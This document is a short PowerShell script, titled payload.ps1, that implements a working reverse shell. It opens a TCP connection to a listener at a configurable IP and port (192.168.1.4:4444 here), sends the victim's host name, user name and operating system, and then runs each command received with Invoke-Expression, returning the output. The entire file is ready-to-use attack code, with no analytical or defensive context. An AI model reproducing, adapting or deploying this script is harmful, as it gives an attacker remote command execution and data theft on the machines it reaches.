# payload.ps1 - SINGLE CONNECTION (NO RECONNECT LOOP)
$serverIP = "192.168.1.4"  # ← YOUR ARCH IP
$serverPort = 4444

function Get-SystemInfo {
    $hostname = $env:COMPUTERNAME
    $username = $env:USERNAME
    $os = (Get-WmiObject Win32_OperatingSystem).Caption
    return "SYSINFO:$hostname|$username|$os"
}

try {
    $client = New-Object System.Net.Sockets.TCPClient
    $client.Connect($serverIP, $serverPort)
    
    $stream = $client.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)
    
    # Send system info
    $writer.WriteLine((Get-SystemInfo))
    $writer.Flush()
    
    # MAIN LOOP (only exits when server disconnects)
    while ($true) {
        $command = $reader.ReadLine()
        if (-not $command) { break }
        if ($command -eq "exit") { break }
        
        $result = iex $command 2>&1 | Out-String
        $writer.WriteLine($result)
        $writer.Flush()
    }
}
finally {
    $client.Close()
}
